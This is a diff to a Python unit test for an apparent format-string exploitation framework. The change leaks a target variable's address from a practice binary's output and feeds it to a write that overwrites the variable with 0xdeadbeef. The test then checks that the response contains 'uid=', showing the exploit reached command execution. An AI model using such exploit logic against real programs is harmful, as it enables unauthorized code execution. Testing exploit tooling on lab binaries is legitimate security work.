@@ -6,6 +6,7 @@ sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../.
 
 from dispatcher import Dispatcher
 from tools.string_bug import FormatStringExploit
+from tools.pattern_tools import extract_tokens
 
 """
 mode: binary
@@ -168,11 +169,22 @@ class TestBinaryNoneStackAlignment(unittest.TestCase):
         self.exploit.setup_address_pattern(b"check at {ignore}\nargv[1] = [{ignore}]\nfmt=[{address}]\ncheck={ignore}\n")
         
         self.exploit.find_offset(max_offset=100, delay_between_request=0, connect_and_close=False, retry_on_error=True)
+
+        self.exploit.dispatcher.send_command(b'A' * 
+                                             len(self.exploit.return_payload(
+                                                 address_overwrite=0xffffcda8,
+                                                 address_wanted=0xdeadbeef
+                                                 )))
+        response = self.exploit.dispatcher.receive_response()
+        check_address = extract_tokens(b"check at {address}\nargv[1] = [{ignore}]\nfmt=[{ignore}]\ncheck={ignore}\n", response)
+        
         response = self.exploit.classic_exploit(
-            address_overwrite=0xffffcec8,
+            address_overwrite=int(check_address['address'], 16),
             address_wanted=0xdeadbeef,
+            win_str="Yeah dude ! You win !\n",
             interactive=False,
         )
+        
         self.assertIn(b'uid=', response, "Response should contain 'uid='")
         
 
